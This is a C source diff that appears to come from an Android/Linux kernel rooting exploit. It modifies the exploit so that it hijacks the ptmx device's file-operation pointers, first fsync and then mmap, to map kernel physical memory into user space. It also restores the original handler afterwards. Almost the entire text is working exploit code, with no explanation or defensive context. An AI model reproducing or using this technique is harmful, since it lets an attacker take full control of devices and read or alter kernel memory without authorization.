@@ -87,16 +87,41 @@ detect_kernel_phys_parameters(void)
   return true;
 }
 
+static void *old_mmap_handler;
+
 int
 ptmx_mmap(struct file *filep, struct vm_area_struct *vma)
 {
-  return remap_pfn_range(vma, vma->vm_start,
-                         kernel_phys_offset >> PAGE_SHIFT,
-                         vma->vm_end - vma->vm_start, vma->vm_page_prot);
+  void **p;
+  int ret;
+
+  p = (void **)ptmx_fops_mmap_address;
+
+  ret = remap_pfn_range(vma, vma->vm_start,
+                            kernel_phys_offset >> PAGE_SHIFT,
+                            vma->vm_end - vma->vm_start, vma->vm_page_prot);
+
+  if (p) {
+    *p = old_mmap_handler;
+  }
+
+  return ret;
+}
+
+static void
+setup_mmap_by_fsync(void)
+{
+  void **p;
+
+  p = (void **)ptmx_fops_mmap_address;
+  if (p) {
+    old_mmap_handler = *p;
+    *p = (void *)&ptmx_mmap;
+  }
 }
 
 static bool
-run_callback_with_mmap(void *user_data)
+run_callback_with_fsync_and_mmap(void *user_data)
 {
   int fd;
   void *address;
@@ -105,6 +130,8 @@ run_callback_with_mmap(void *user_data)
   bool ret;
 
   fd = open(PTMX_DEVICE, O_RDWR);
+  fsync(fd);
+
   address = mmap(start_address, KERNEL_SIZE,
                  PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED,
                  fd, 0);
@@ -170,6 +197,12 @@ run_with_mmap(memory_callback_t callback)
     return false;
   }
 
+  setup_ptmx_fops_fsync_address();
+  if (!ptmx_fops_fsync_address) {
+    printf("You need to manage to get ptmx_fops address.\n");
+    return false;
+  }
+
   setup_ptmx_fops_mmap_address();
   if (!ptmx_fops_mmap_address) {
     printf("You need to manage to get ptmx_fops address.\n");
@@ -185,9 +218,9 @@ run_with_mmap(memory_callback_t callback)
     return false;
   }
 
-  return attempt_exploit(ptmx_fops_mmap_address,
-                         (unsigned long int)&ptmx_mmap, 0,
-			 run_callback_with_mmap, callback);
+  return attempt_exploit(ptmx_fops_fsync_address,
+                         (unsigned long int)&setup_mmap_by_fsync, 0,
+			 run_callback_with_fsync_and_mmap, callback);
 }
 
 static bool
